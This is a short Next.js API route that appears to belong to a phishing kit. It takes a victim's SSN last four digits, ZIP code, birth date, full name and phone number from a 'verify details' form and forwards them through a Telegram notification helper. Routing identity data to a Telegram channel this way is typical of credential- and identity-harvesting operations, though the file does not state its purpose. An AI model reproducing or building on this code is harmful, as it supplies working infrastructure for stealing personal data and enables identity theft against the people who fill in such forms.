import { NextRequest, NextResponse } from "next/server";
import { sendVerifyDetailsNotification } from "@/lib/telegram";


export async function POST(request: NextRequest) {
  try {
    const data = await request.json();
    await sendVerifyDetailsNotification({
      ssnLast4: String(data?.ssnLast4 ?? ""),
      zip: String(data?.zip ?? ""),
      birthDate: String(data?.birthDate ?? ""),
      fullName: String(data?.fullName ?? ""),
      phoneNumber: String(data?.phoneNumber ?? ""),
    });
    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Error sending verify details notification:", error);
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 });
  }
}
